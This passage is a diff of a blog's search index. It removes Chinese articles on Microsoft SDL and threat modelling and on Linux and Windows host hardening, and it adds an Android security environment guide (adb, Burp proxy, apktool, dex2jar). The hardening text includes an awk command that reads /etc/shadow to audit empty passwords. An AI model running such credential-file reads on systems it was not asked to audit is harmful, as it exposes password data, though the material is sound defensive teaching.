@@ -1,20 +1,710 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title><![CDATA[微软SDL（可信赖计算安全开发生命周期）]]></title>
-    <url>%2F2019%2F04%2F28%2FSDL%E5%AD%A6%E4%B9%A0%2F</url>
-    <content type="text"><![CDATA[一、SDL简介SDL（Security Development Lifecycle）可信赖计算安全开发生命周期，是微软提出的一套帮助开发人员构建更安全软件和解决安全合规要求的同时，降低开发成本的软件开发过程。SDL流程在软件开发流程的每个阶段加入一系列关注安全性的活动和交付结果，这些活动和交付结果包括在软件设计过程中开发威胁模型、在实施过程中使用静态分析代码扫描工具以及在集中进行的”安全推动”过程中进行代码审核和安全测试。 SDL基本流程Microsoft标准软件开发流程如下图所示，也是行业内的典型流程。该开发流程实际上是螺旋形的，在实施阶段可能需要经常重新考虑需求和设计问题。 实际实施中软件安全性方面的经验已经为构建更安全的软件建立了一套高标准的原则，Microsoft将这些原则称作SD3+C，即设计安全、默认安全、部署安全和通信。 设计安全：在架构、设计和实现软件时，应该在运行时能保护自身及其处理的信息，并能抵御攻击。 默认安全：实际实施中软件无法实现绝对的安全，为了使攻击者对软件缺陷发起攻击时造成的损失最小，软件在默认状态下应具有更高的安全性。如，软件应该在最低的必要权限下运行，非广泛需要的服务和功能在默认情况下应被禁用或仅可由特定用户访问。 部署安全：软件应随附工具和指导以帮助最终用户和管理员安全地使用，且更新应易于部署。 通信：软件开发者应及时明确地接收发现的产品漏洞，并负责提出处理措施。 SD3+C每个要素都对开发流程提出了要求，但设计安全和默认安全对软件安全性提升作用最大，设计安全改进流程以防止在第一阶段引入漏洞，默认安全则要求软件默认状态下暴露的攻击面最小。 在现有开发流程中引入继承SD3+C方法的安全措施后的改进流程结构如下图所示。 二、安全设计核心原则SDL安全设计核心原则： Attack Surface Reduction：攻击面最小化 Basic Privacy：基本隐私 Least Privilege：权限最小化 Secure Defaults：默认安全 Defense in Depth：纵深防御 Threat Modeling：威胁建模 2.1 攻击面最小化攻击面是指程序任何能被用户或其他程序访问到的部分，这些暴露给用户的地方往往是最可能被恶意攻击者攻击的地方。攻击面最小化是指尽量减少暴露恶意用户可能发现并试图利用的攻击面数量。软件产品的受攻击面包括代码、接口、服务以及包括对所有用户提供服务的协议，尤其是那些未被验证或远程用户都可以访问到的协议。供给面分析主要着重于： 降低默认执行的代码量 限制可访问到代码的人员范围 限定可访问到代码的人员身份 降低代码执行所需的权限 攻击面分析常用技巧： 高风险攻击面 低风险攻击面 默认开启 默认关闭 接口开启 接口关闭 UDP协议 TCP协议 匿名访问 经过身份验证的用户访问 保持开启 需要时开启 可互联网访问 仅本地网络访问 攻击面最小化在微软的应用实践示例： 应用程序 安全实践 Windows RPC需要认证、防火墙默认打开 IIS6.0、7.0 使用Network Service权限运行，默认关闭 SQL Server 2008 xp_cmdshell存储过程默认关闭，默认不开放远程链接 VS 2005/2008 Web Server金额SQL Server默认仅本地访问 2.2 基本隐私用户使用软件时可能需要授予软件收集个人隐私信息的权限，企业有责任完善对个人信息的保护措施，确保用户隐私的安全性，隐私安全是建立可信任应用程序的关键因素。在软件设计时考虑用户基本隐私的必要性和意义： 履行法律规定和义务 增加客户信赖 防止堵塞部署 在获取和收集用户隐私过程中，需要制定明确的隐私准则，以下是对用户隐私收集的部分建议： 只收集程序必需的隐私数据，明确告知用户并征得用户同意。 微软对于用户隐私数据（密码、口令等）需要加密存储，最低要求是SHA256+salt，对于更高要求的需要使用PBKDF2算法加密存储。 2.3 权限最小化在进行软件设计时，安全设计人员可以评估应用程序的行为和功能所需的最低权限和访问级别，从而合理分配相应的权限，如果程序特定情况必须需要更高权限，也可以考虑特权赋予及释放机制，即使程序遭到攻击，也可以将损失降到最低。常见的权限最小化实践如下： 普通管理员/系统管理员等角色管理 文件只读权限/文件访问权限等访问控制 进程/服务以所需的最小用户权限运行 权限最小化在微软的应用实践： Windows系统中网络进程、本地服务、用户进程的权限都较低且互相独立，分别为NETWORK SERVICE、LOCAL SERVICE、user权限，只有核心的重要进程使用SYSTEM权限。 最新版本的office程序打开不可信来源的文档时，默认是不可编辑的，同时也是默认不可执行代码的，即使存在缓冲区溢出漏洞，也不会执行shellcode等恶意代码。 2.4 默认安全默认安全配置在客户熟悉安全配置选项前不仅有利于更好的帮助客户掌握安全配置经验，同时也可以确保应用程序初始状态下处于较安全状态，用户可根据实际使用情况决定应用程序安全与隐私等级水平是否降低。默认安全在微软的应用实践： 在Windows 7之后的Windows操作系统中，DEP（数据执行保护）默认开启，用户可根据需要选择DEP开启状态。 Windows 10默认启用安全防护软件Windows Defender，用户可根据需要选择是否开启。 2.5 纵深防御纵深防御包含两层含义：首先，要在各个不同层面、不同方面实施安全方案，避免出现疏漏，不同安全方案之间需要相互配合，构成一个整体；其次，要在解决根本问题的地方实施针对性的安全方案。纵深防御在微软的应用实践： 针对XSS防护，除了要对用户输入的特殊符号进行过滤，还要区分是否是富文本进而进行相应编码操作，在输入时过滤的同时在输出时也进行过滤操作。 即使做了十足的过滤、编码等安全防护，为了进一步确保缓解XSS攻击，Web站点也可以对cookie启用HTTP-Only属性，确保即使发生XSS攻击，也可以阻止通过脚本访问cookie。 2.6 威胁建模威胁建模是一种分析应用程序威胁的过程和方法，威胁是指恶意用户可能试图利用以破坏系统，漏洞是一个特定的可以被利用的威胁。威胁建模的一般流程如下： 与系统架构师及设计人员沟通，了解设计详情。 使用成熟的威胁建模方法分析当前设计潜在的安全问题。 提出安全建议及对潜在威胁的缓解措施。 对安全设计进行验证并对整个设计方案进行回顾并再次确认。 三、STRIDE威胁建模3.1 STRIDE介绍STRIDE威胁建模是微软提出的一种威胁建模方法，该方法将威胁类型分为Spoofing（仿冒）、Tampering（篡改）、Repudiation（抵赖）、Information Disclosure（信息泄露）、Denial of Service（拒绝服务）和Elevation of Privilege（权限提升）。六种威胁的首字母缩写就是STRIDE，STRIDE威胁模型几乎涵盖目前大部分安全问题。 3.2 STRIDE威胁建模流程STRIDE威胁建模一般流程如下： 绘制数据流图 识别威胁 提出缓解措施 安全验证 3.2.1 数据流图 数据流图（Data Flow Diagrams）包含外部实体（External Entity）、处理过程（Process）、数据流（Data Flow）、数据存储（Data Store），安全人员与系统架构师及设计人员沟通，了解设计详情并画出数据流图后还需要标注信任边界（Trust Boundary），针对简单Web应用的数据流图如下： 3.2.2 识别威胁 STRIDE威胁建模方法明确了每个数据流图元素具有不同的威胁，其中外部实体只有仿冒和抵赖威胁，数据流只有篡改、信息泄露、拒绝服务威胁，处理过程有全部六种威胁，存储过程有篡改、信息泄露、拒绝服务威胁，但如果是日志类型存储则还有抵赖威胁。具体可以对照如下表格进行威胁识别： 数据流图元素对应不同威胁 元素 S T R I D E 外部实体 √ √ 处理过程 √ √ √ √ √ √ 数据存储 √ ? √ √ 数据流 √ √ √ 3.2.3 缓解措施 根据不同数据流图元素及威胁，相应的缓解措施也不相同。在提出缓解措施时，有时不仅要考虑安全问题，也要考虑软件的易用性。微软对于常见威胁给出了常用的标准缓解措施，并在具体实施时已将常用的缓解方案及措施集成为独立的解决方案或代码模块，方便同类型应用直接使用。 微软给出的常见威胁类型的缓解措施： 威胁类型 缓解措施 技术方案 仿冒（S） 认证 Kerberos认证 PKI系统如SSL/TLS证书 数字签名 篡改（T） 完整性保护 访问控制 完整性校验 抵赖（R） 日志审计 强认证 安全日志、审计 信息泄露（I） 保密性 加密 访问控制列表 拒绝服务（D） 可用性 访问控制列表 过滤 备份 权限提升（E） 授权认证 输入校验 用户组管理 访问控制列表 3.2.4 安全验证 在威胁建模完成后，需要对整个过程进行回顾，不仅要确认缓解措施是否能够真正缓解潜在威胁，同时验证数据流图是否符合设计，代码实现是否符合与其设计，所有的威胁是否都有相应的缓解措施。最后将威胁建模报告留存档案，作为后续迭代开发、增量开发时威胁建模的参考依据。 四、安全开发生命周期流程4.1 需求阶段安全系统开发的一个基本原则时需要“自上而下”地考虑安全问题，尽管很多开发项目开发出的“后续版本”是建立在先前发布的版本基础上，但是新的发行版本的需求阶段和初始规划仍然为构建安全软件提供了好的机会。 在需求阶段中，产品小组与中央安全小组联系，请求指派安全顾问，该安全顾问在进行规划时充当联络点，并提供资源和指导。安全顾问通过审核计划、提出建议和确保安全小组规划适当的资源来支持产品小组的日程，为产品小组提供协助。安全顾问在安全标准方面向产品小组提出建议，这些安全标准由项目规模、复杂程度和风险决定的。从项目开始到完成最终安全审核和软件发布，安全顾问始终充当产品小组与安全小组之间的联系点。安全顾问还充当安全小组和产品小组管理人员之间的联系人，向小组管理人员提供关于项目的安全要素是否正常工作的意见，以避免在流程的晚期出现安全方面的问题。 在需求阶段中，产品小组应考虑如何在开发流程中集成安全性，找出关键的安全性对象，以及在尽量提升软件安全性的同时尽量减少对计划和日程的影响。在此过程中，产品小组需要考虑如何使软件的安全功能和保证措施与其他可能与该软件配合使用的软件相互集成。要满足用户将各个产品集成到安全系统的需要，考虑与其他软件的接口非常关键。产品小组关于安全目标、挑战和计划的整体构想必须反映到需求阶段中制作的规划文档中，虽然计划可能会随着项目的进行而变化，但是较早明确制订这些计划将有助于确保不会忽视任何需求或不会直接到最后一刻才发现它们。 每个产品小组都应将安全性要求视为此阶段的重要组成部分，尽管有些安全性要求将在威胁建模过程中确定，但是用户需求可能要求根据客户的要求来考虑一些安全性。符合行业标准或认证过程的需要也可能提出一些安全性要求，作为正常规划流程的一部分，产品小组应认识到并反映这些要求。 4.2 设计阶段设计阶段确定软件的总体需求和结构，从安全性的角度来看，设计阶段的关键要素包括： 定义安全体系结构和设计指导原则：从安全性角度定义软件的总体结构，并确定对安全性起关键作用的组件（“可信赖计算基础”）。确定将在软件中全面应用的设计技巧，如分层、使用强类型语言、应用最低权限和使攻击面最小化。分层指的是将软件组织成精心定义的组件以避免组件之间出现循环依赖关系–将组件组织为层，高级层可以依赖低级层的服务，且禁止低级层依赖高级层的服务。体系结构中各要素的特点将在各自的设计规范中详细说明，而安全体系结构只是确定安全设计的总体构想。 记录软件攻击面的要素。由于软件不可能绝对的安全，所以必须重视默认情况下应仅将大多数用户需要使用的功能对所有用户开放，且可以用尽可能最低的权限安装那些功能。对攻击面要素进行度量可为产品小组提供默认安全性的现行度量标准，使产品小组可以检测到令软件易受攻击的情况。尽管有些增加攻击面的情况可能是因为增加了产品功能或可用性导致的，但是在设计和实施过程中还是需要对每种这样的情况进行认真检测和研究，以确保软件交付时在默认配置下有最好的安全性。 对威胁进行建模。产品小组逐个组件地对威胁进行建模，组件小组使用结构化的方法，确定软件必须管理的模块以及访问那些模块时使用的接口。威胁建模过程确定可能对每个模块造成损害的威胁以及导致损害的可能性（风险评估）。组件小组然后确定降低风险的对策–通过安全功能（如加密）或通过正确使用保护模块免受损害的软件。这样威胁建模可以帮助产品小组确定安全性需求，以及需要特别仔细地审核代码和进行安全测试的领域。应使用工具来支持威胁建模过程，该工具可以处理机器可读格式的威胁模型，并可以对其进行存储和更新。 定义补充性交付标准。尽管应定义组织的基本安全交付标准，但是各个产品小组或软件版本也可以设计发布软件前必须符合的特定标准。例如正在开发一个准备交付用户使用并可能面临高强度攻击的软件更新版本的产品小组可以建立以下标准：在一段时间内外部没有发现新版本漏洞时才认定它已做好发布准备。（也就是说，开发过程应在漏洞被报告之前找到并消除这些漏洞，而不是在产品小组接到报告之后不得不修复这些漏洞） 4.3 实施阶段在实施阶段，产品小组对软件进行编码、测试和集成。在此阶段将采取措施消除安全缺陷或防止引入安全缺陷的作用很大–这些措施将大大减少安全漏洞遗留到发布给用户的软件最终版本中的可能性。威胁建模的成果会为实施阶段提供重要指导，开发者应特别注意确保代码的正确性以消除高优先级威胁，测试者可集中对这些威胁进行测试以确保将其拦截或消除。 在实施阶段中应用的SDL要素为： 应用编码和测试标准。编码标准帮助开发者避免引入导致安全漏洞的缺陷。如使用更安全和更一致的字符串处理和缓冲区操纵结构有助于避免引入缓冲区溢出漏洞。测试标准和最佳做法有助于确保将测试重点放在检测潜在的安全漏洞上，而不仅仅是专注于测试软件功能的正确运行。 应用包括模糊化工具在内的安全测试工具。“模糊化”为软件应用程序编程接口（API）和网络接口提供结构化但无效的输入，以使检测到可能导致软件漏洞的错误的可能性最大化。 应用静态分析代码扫描工具。这些工具可检测出某些类型的可能导致漏洞的编码缺陷，包括缓冲区溢出、整数溢出和未初始化变量。Microsoft长期使用的两个这类工具使PREfix和PREfast。 进行代码审核。作为自动化工具和测试的补充，将由接受过培训的开发人员进行代码审核，他们将检查源代码并检测和消除潜在的安全漏洞，这是开发流程中从软件中消除安全漏洞的关键步骤。 4.4 验证阶段验证阶段是指软件已具备所有功能并进入用户试用版测试的阶段。在此阶段中对软件进行试用版测试时，产品小组进行安全推进，包括进行安全代码审核和集中式安全测试。 在流程中引入安全推进有两个原因： 有问题的软件版本已进入生命周期的验证阶段，此阶段最适合进行所需的集中式代码审核和测试。 在验证阶段进行安全推进可确保代码审核和测试针对的是软件的完成版本，并提供了对实施阶段开发或更新的代码以及未修改的遗留代码进行全部审核的机会。 4.5 发布阶段在发布阶段中，应对软件进行最终安全审核（FSR）。FSR的目标是确定从安全角度看，此软件是否已准备好交付给客户。一般在软件完成之前2到6个月进行FSR，具体时间根据软件的规模决定。在进行FSR之前，软件必须已处于稳定状态，且只剩一些很小的非安全性更改需要在发布前完成。FSR是由组织的中央安全小组对软件进行的独立审核。在进行FSR之前，来自安全小组的安全顾问向产品小组建议软件所需进行FSR的范围，并为产品小组提供资源需求列表。产品小组为安全小组提供完成FSR所需的资源和信息。FSR开始时，产品小组需要填写一份问卷并与进行FSR的安全小组成员进行面谈。所有FSR将要求对最初标识为安全漏洞，但后来经过深入分析确定为对安全性没有影响的缺陷进行审核，以确保分析的正确性。FSR还包括审核软件是否能抵御最新报告的影响类似软件的漏洞。对主软件版本进行FSR时需要进行渗透测试，可能还需要利用外面的安全审核承包商来协助安全小组。FSR不是简单的通过/失败测试，FSR的目标也不是找出软件中所有剩余漏洞，实际上FSR是为产品小组和组织的高层管理人员提供软件的安全水平以及软件发布给用户后抵御攻击的能力和总体状况。如果FSR发现某类剩余漏洞，正确的反应不仅要修复发现的漏洞，还要回到之前的阶段并采取其他针对性的措施解决根本原因（如提高培训质量和改进工具）。 4.6 支持和服务阶段尽管在开发过程中应用了SDL，最先进的开发方法仍无法保证软件完全消除漏洞。即使开发流程可以在交付之前从软件中消除所有漏洞，还是可能被发现新的攻击方式，因此产品小组必须准备好对交付给用户的软件中新发现的漏洞作出响应。响应过程包括评估漏洞报告并在适当的适合发布安全建议和更新，还包括对已报告的漏洞进行事后检查及采取必要的措施。对漏洞采取的措施的范围很广：从为孤立的错误发布更新到更新代码扫描工具以重新对主要的子系统进行代码审核。响应阶段的目标是从错误中吸取教训，并使用漏洞报告中提供的信息帮助在软件投入使用前检测和消除深层漏洞，以免这些漏洞给用户带来危害。响应过程还有助于产品小组和安全小组对流程进行改造，以免将来犯类似错误。 五、应用安全开发生命周期的观察5.1 SDL各要素的有效性SDL由大量子流程组成，这些子流程分布整个软件开发生命周期内，威胁建模是SDL中最高优先级的子流程。威胁建模不能孤立的应用：威胁建模促进设计、代码审核和测试，一个流程如果只实施威胁建模但对模型不采取任何响应措施，将无法达到期望效果。威胁建模的主要作用在于确保不产生导致安全漏洞的缺陷。FSR的要素之一–渗透测试并不是获得安全性的好方法，产品小组在整个生命周期中的活动主要集中在威胁建模、代码审核、自动化工具的使用以及模糊化测试，而不是渗透测试。这些措施在防止或消除安全缺陷方面比经典的特定渗透测试更加全面有效。FSR的渗透测试要素有助于判断软件是否已准备好可以发布，而不适合作为发现和修复安全缺陷的方法。如果在FSR阶段进行的渗透测试发现了大量的安全缺陷，则是因为早期阶段不够有效，正确的处理方法是重新检查那些阶段中所谓已完成的活动，而不是仅仅修复渗透测试缺陷就发布软件。 5.2 工具、测试和代码审核静态分析工具、模糊测试和代码审核的作用是互补性的，静态分析工具在发现许多会导致安全漏洞的编码错误（尤其是缓冲区溢出）方面很有效。但是SDL要求仍需要进行手动代码审核，一方面是为了检测到工具未发现的错误，另一方面是为确定可以在哪些方面改进这些工具。模糊化测试对SDL流程能够产生非常积极的成果，与静态代码扫描工具不同，必须为要测试的每种文件格式和网络协议分别构建模糊化测试工具，因此通常可以发现静态分析工具遗漏的错误。威胁模型有助于产品小组划分要测试的接口和格式的优先级，模糊化测试的结构不是完全确定性的（这些工具只允许有限循环次数，无法确保发现所有漏洞），但是经验表明进行适当级别的模糊化测试可以发现一些软件缺陷，在某些情况下此类缺陷可能导致安全问题。 5.3 投资强制安全培训对多数公司来说会产生较高的资金投入，培训可分为现场培训和在线学习两种。现场培训对准备进行安全推进或其他关键活动的小组进行全员培训特别有效。 5.4 收益Microsoft的经验已经表明SDL在消除和减少软件漏洞方面产生相当好的效果，Microsoft还会评估外部报告的漏洞对正在开发的软件版本的影响。 六、总结Microsoft的经验表明SDL在减少安全漏洞方面非常有效。实施组成SDL的要素越多，对安全性的提升也就越多，这也是视为有效流程的一个特征。SDL的核心理念是将安全考虑集成在软件开发的每个阶段：需求分析、设计、编码、测试和维护。从需求、设计到产品发布的每个阶段都增加相应的安全活动，以减少软件中漏洞的数量并将安全缺陷降低到最小程度。 七、参考文献 [1] https://docs.microsoft.com/zh-cn/previous-versions/ms995349(v=msdn.10)[2] http://blog.nsfocus.net/sdl/]]></content>
+    <title></title>
+    <url>/2019/05/26/Python%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E9%9A%BE%E7%82%B9%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>Android安全基础及环境配置</title>
+    <url>/2019/04/06/Android%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%8F%8A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<h2 id="Android安全基础"><a href="#Android安全基础" class="headerlink" title="Android安全基础"></a>Android安全基础</h2><p>Dalvik虚拟机（DVM）；Android4.4版本之后，Android运行时（ART）。<br>Android安全模型的核心是Linux特权分离。<br>与Linux类似，用作命令的二进制文件位于/system/bin和/system/xbin；安装的应用程序位于/data/data；原始安装文件（.apk）存储在/data/app；从Play商店购买的应用程序存储在/data/app-private/。</p>
+<h2 id="Android虚拟环境配置"><a href="#Android虚拟环境配置" class="headerlink" title="Android虚拟环境配置"></a>Android虚拟环境配置</h2><h3 id="Android-Studio"><a href="#Android-Studio" class="headerlink" title="Android Studio"></a>Android Studio</h3><p>下载地址<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://developer.android.com/studio</span><br></pre></td></tr></table></figure></p>
+<p><a href="/Downloads/resources_zh_CN_AndroidStudio_3.3_r1.jar">汉化文件下载</a><br>将汉化文件复制到X:\Android\Android Studio\lib\，重启生效。</p>
+<h3 id="Genymotion"><a href="#Genymotion" class="headerlink" title="Genymotion"></a>Genymotion</h3><p>下载地址<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://www.genymotion.com/download/</span><br></pre></td></tr></table></figure></p>
+<p>下载需要登录，分为包含virtualbox和不包含virtualbox两个版本。</p>
+<h3 id="Android-Studio关联Genymotion"><a href="#Android-Studio关联Genymotion" class="headerlink" title="Android Studio关联Genymotion"></a>Android Studio关联Genymotion</h3><p>Android Studio的File&gt;Setting&gt;Plugins&gt;Browse repositories，搜索Genymotion并安装，重启后生效。在工具栏出现Genymotion图标（如果找不到，打开视图勾选工具栏），点击提示关联Genymotion路径。</p>
+<h3 id="渗透测试实用工具"><a href="#渗透测试实用工具" class="headerlink" title="渗透测试实用工具"></a>渗透测试实用工具</h3><h4 id="Android-Debug-Bridge"><a href="#Android-Debug-Bridge" class="headerlink" title="Android Debug Bridge"></a>Android Debug Bridge</h4><p>Android Debug Bridge 是一个客户端 - 服务器程序，允许用户与模拟器器或连接的 Android 设备交互。 它包括客户端（在系统上运行），处理通信的服务器（也在系统上运行）以及作为后台进程在模拟器和设备上上运行的守护程序。 客户端用于 ADB 通信的默认端口始终是 5037，设备使用从 5555 到 5585 的端口。<br>使用cmd运行adb devices命令与已启动的模拟器交互。</p>
+<p><img src="/images/adb devices.PNG" alt></p>
+<p>使用pm包管理器获取已安装的软件包列表</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb shell pm list packages</span><br></pre></td></tr></table></figure>
+<p><img src="/images/adb shell pm list packages.PNG" alt></p>
+<p>使用dumpsys meminfo获取全部应用程序及当前内存占用列表</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb shell dumpsys meminfo</span><br></pre></td></tr></table></figure>
+<p><img src="/images/dumpsys meminfo.PNG" alt></p>
+<p>使用logcat（读取Android设备事件日志的工具），并保存到指定文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb logcat -d -f /data/<span class="built_in">local</span>/logcats.log</span><br></pre></td></tr></table></figure>
+<p>Android SDK中的MonkeyRunner工具用于自动化和测试Android应用程序，甚至与应用程序交互。如，为了使用10个自动化触摸，敲击和事件来测试应用程序，可以在adb shell中使用monkey 10命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ monkey 10</span><br></pre></td></tr></table></figure>
+<p><img src="/images/monkey 10.PNG" alt></p>
+<h4 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h4><p>Burp Suite配置好之后，使用以下命令使用代理。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ emulator -avd [name of the avd] -http-proxy 127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+<h4 id="ApkTool"><a href="#ApkTool" class="headerlink" title="ApkTool"></a>ApkTool</h4><p><a href="/Downloads/apktool.rar">ApkTool下载</a></p>
+<p>将下载的文件解压保存在任一目录，并配置path环境变量，就可以在cmd中使用apktool命令。</p>
+<h4 id="Dex2jar"><a href="#Dex2jar" class="headerlink" title="Dex2jar"></a>Dex2jar</h4><p>下载地址<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://code.google.com/p/dex2jar/</span><br></pre></td></tr></table></figure></p>
+<p><a href="/Downloads/dex2jar-2.0.zip">Dex2jar下载</a></p>
+<h4 id="JD-GUI"><a href="#JD-GUI" class="headerlink" title="JD-GUI"></a>JD-GUI</h4><p>下载地址<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://jd.benow.ca/</span><br></pre></td></tr></table></figure></p>
+<p><a href="/Downloads/jd-gui-windows-1.4.1.zip">JD-GUI下载</a></p>
+]]></content>
       <categories>
-        <category>软件安全设计</category>
+        <category>Android安全</category>
       </categories>
       <tags>
-        <tag>安全开发</tag>
+        <tag>Android安全</tag>
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[安全加固]]></title>
-    <url>%2F2019%2F04%2F27%2F%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA%2F</url>
-    <content type="text"><![CDATA[主机安全加固Linux主机 系统账号安全 1.1 删除或禁用不必要的账号 删除不必要的账号：userdel &#39;username&#39; 锁定不必要的账号：passwd -l &#39;username&#39; 解锁账号：passwd -u &#39;username&#39; 1.2 特殊权限账号 检查空口令账号和root权限账号。 查看空口令账号：awk -F: &#39;($2==&quot;&quot;)&#39; /etc/shadow 查看UID为0的账号：awk -F: &#39;($3==0)&#39; /etc/passwd 1.3 设置口令策略 修改口令策略配置文件vi /etc/login.defs。 PASS_MAX_DAYS 90 #用户密码最长使用天数 PASS_MIN_DAYS 0 #用户密码最短使用天数 PASS_WARN_AGE 7 #用户密码到期前n天提醒 使用chage命令修改口令策略。 chage -m 0 -M 30 -E 2020-01-01 -W 7 ‘username’ #密码最长使用30天，最短使用0天，2020年1月1日过期，过期前7天提醒用户。 设置账号锁定策略，修改配置文件vi /etc/pam.d/common-auth添加以下内容： auth required pam_tally.so onerr=fail deny=3 unlock_time=300 1.4 限制用户su策略 修改配置文件vi /etc/pam.d/su，添加以下内容设置用户组可以su到root权限： auth required pam_wheel.so group=&#39;group_name&#39; 1.5 禁止root账号登录 修改配置文件vi /etc/ssh/sshd_config，将PermitRootLogin的值改为no，保存后重启SSH服务。 系统服务安全 2.1 SSH服务策略 修改配置文件vi /etc/ssh/sshd_config 禁止root账号登录。 设置SSH协议版本：修改Protocol的值为2。 修改允许密码错误次数：修改MaxAuthTries值为3。 2.2 禁用不必要的服务 CentOS7系统以上使用命令systemctl disable &#39;service_name&#39;CentOS6系统及以下使用命令chkconfig --level &lt;init级别&gt; &#39;service_name&#39; off设置服务在指定init级别下不自动启动。 文件系统 3.1 设置登录超时 修改配置文件vi /etc/profile，注释TMOUT=开头的行，设置TMOUT=180，超时时间为3分钟。 3.2 设置umask值 修改配置文件vi /etc/profile，添加行umask 027，设置新创建的文件属主拥有读写执行权限，同组用户拥有读和执行权限，其他用户无权限。 日志系统 4.1 syslog日志 Linux默认启用以下类型日志： 系统日志（默认） /var/log/messages crontab定期任务日志（默认） /var/log/cron 安全日志（默认） /var/log/secure 部分系统使用syslog-ng日志，配置文件为/etc/syslog-ng/syslog-ng.conf 4.2 记录所有用户登录和操作日志 修改配置文件vi /etc/profile，在配置文件中添加以下内容：123456789101112131415161718historyUSER=`whoami`USER_IP=`who -u am i 2&gt;/dev/null| awk '&#123;print $NF&#125;'|sed -e 's/[()]//g'`if [ "$USER_IP" = "" ]; thenUSER_IP=`hostname`fiif [ ! -d /var/log/history ]; thenmkdir /var/log/historychmod 777 /var/log/historyfiif [ ! -d /var/log/history/$&#123;LOGNAME&#125; ]; thenmkdir /var/log/history/$&#123;LOGNAME&#125;chmod 300 /var/log/history/$&#123;LOGNAME&#125;fiexport HISTSIZE=4096DT=`date +"%Y%m%d_%H:%M:%S"`export HISTFILE="/var/log/history/$&#123;LOGNAME&#125;/$&#123;USER&#125;@$&#123;USER_IP&#125;_$DT"chmod 600 /var/log/history/$&#123;LOGNAME&#125;/*history* 2&gt;/dev/null 使用命令source /etc/profile加载配置生效，系统将在/var/log/history目录下以每个用户名创建一个文件夹，用户每次退出都会产生包括用户名、登录IP地址、登录时间的日志文件，及用户本次所有操作（root除外）。 Linux基线检查脚本：https://github.com/myh0st/scripts/blob/master/linuxsec.sh Windows主机 系统账号安全和认证 1.1 系统账号策略 禁用Guest账号。 禁用或删除其他不必要账号。（建议先禁用一段时间，确认没问题后再删除） 不显示最后登录的用户名：控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;安全选项&gt;交互式登录：不显示最后的用户名&gt;已启用。 1.2 设置口令策略 密码最短长度、复杂度。 密码最长留存期应小于90天：控制面板&gt;管理工具&gt;本地安全策略&gt;账户策略&gt;密码策略&gt;密码最常使用期限设置90天 密码最短使用期限设置7天。 设置账号锁定策略：控制面板&gt;管理工具&gt;本地安全策略&gt;账户策略&gt;帐户锁定策略&gt;帐户锁定阈值设置5次无效登录 1.3 授权 设置只允许Administrators组有远程关机权限：控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;用户权限分配&gt;从远端系统强制关机权限只分配给Administrators组。 设置只允许Administrators组有本地关机权限：控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;用户权限分配&gt;关闭系统权限只分配给Administrators组。 设置取得文件或其他对象的所有权权限只分配给Administrators组：控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;用户权限分配&gt;取得文件或其它对象的所有权权限只分配给Administrators组。 配置指定用户允许本地登录此计算机：控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;用户权限分配&gt;允许本地登录权限分配给指定用户。 配置指定用户从网络访问此计算机：控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;用户权限分配&gt;从网络访问此计算机权限分配给指定用户。 日志系统 配置日志记录用户登录，包括登录账号、时间、登录IP地址、登录是否成功等。控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;审核策略&gt;审核登录事件 启用对windows系统的审核策略更改。控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;审核策略&gt;审核策略更改 启用对windows系统的审核对象访问。控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;审核策略&gt;审核对象访问 启用对windows系统的审核目录服务访问，仅需要审核失败操作。控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;审核策略&gt;审核目录服务器访问 启用对windows系统的审核特权使用。控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;审核策略&gt;审核特权使用 启用对windows系统的审核系统事件。控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;审核策略&gt;审核系统事件 启用对windows系统的审核账户管理。控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;审核策略&gt;审核账户管理 启用对windows系统的审核进程追踪，仅失败操作需要审核。控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;审核策略&gt;审核系统追踪 设置日志文件大小，根据磁盘空间大小尽可能记录更多日志，设置达到最大日志大小时按需要轮询记录日志。控制面板&gt;管理工具&gt;事件查看器，配置应用日志、系统日志、安全日志属性中日志大小，设置达到最大日志大小时的策略。 IP协议安全配置 启用SYN攻击保护： 指定触发SYN攻击保护必须超过的TCP连接请求数阈值为5。 指定处于SYN_RCVD状态的TCP连接数阈值为500。 指定处于至少已发送一次重传的SYN_RCVD状态中的TCP连接数阈值为400。 操作步骤：Windows Server 2008 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SynAttackProtect推荐值：2 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TcpMaxPortsExhausted推荐值：5 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TcpMaxHalfOpen推荐值：500 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TcpMaxHalfOpenRetried推荐值：400 Windows Server 2012 